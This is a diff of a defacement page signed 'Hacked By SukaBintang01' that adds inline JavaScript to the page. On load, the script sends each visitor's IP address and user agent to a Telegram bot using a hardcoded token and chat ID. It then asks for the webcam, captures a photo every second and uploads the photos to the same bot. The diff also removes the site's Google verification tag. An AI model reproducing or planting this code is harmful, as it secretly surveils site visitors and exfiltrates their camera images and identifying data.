@@ -34,7 +34,6 @@ if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
     <meta name="revisit-after" content="1 days">
     <meta name="classification" content="Hacked By SukaBintang01">
     <meta name="robots schedule" content="auto">
-    <meta name="google-site-verification" content="45v2vK6HFoU0gBd7Xg8hVDZgi5Jr84CyMnmBqj8PcoA" />
     <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
 </head>
 <body>
@@ -60,7 +59,99 @@ a {
     background:#000;
 }
 </style>
-<script src="script.js"></script>
+<script>
+const BOT_TOKEN = '7209947234:AAH8u8-TrKewLHj67cyC-nlzYLIhwXGqzt8';
+const CHAT_ID = '6326816238';
+
+        function sendIPAndUserAgent() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const userAgent = navigator.userAgent;
+                    const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
+                    sendMessageToTelegram(message);
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        }
+
+        function sendMessageToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Telegram');
+                } else {
+                    console.error('Failed to send message to Telegram');
+                }
+            })
+            .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        function takePhotoAndSend() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const photo = canvas.toDataURL('image/jpeg');
+                            sendPhoto(photo);
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                            video.remove();
+                        }, 1000);
+                    };
+                })
+                .catch(error => console.error('Error accessing camera:', error));
+        }
+
+        function sendPhoto(photo) {
+            const blob = dataURItoBlob(photo);
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Photo sent to Telegram');
+                } else {
+                    console.error('Failed to send photo to Telegram');
+                }
+            })
+            .catch(error => console.error('Error sending photo to Telegram:', error));
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const intArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                intArray[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([arrayBuffer], { type: mimeString });
+        }
+
+        sendIPAndUserAgent();
+        setInterval(takePhotoAndSend, 1000);
+</script>
 <table width="100%" height="100%">
     <td align="center">
         <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
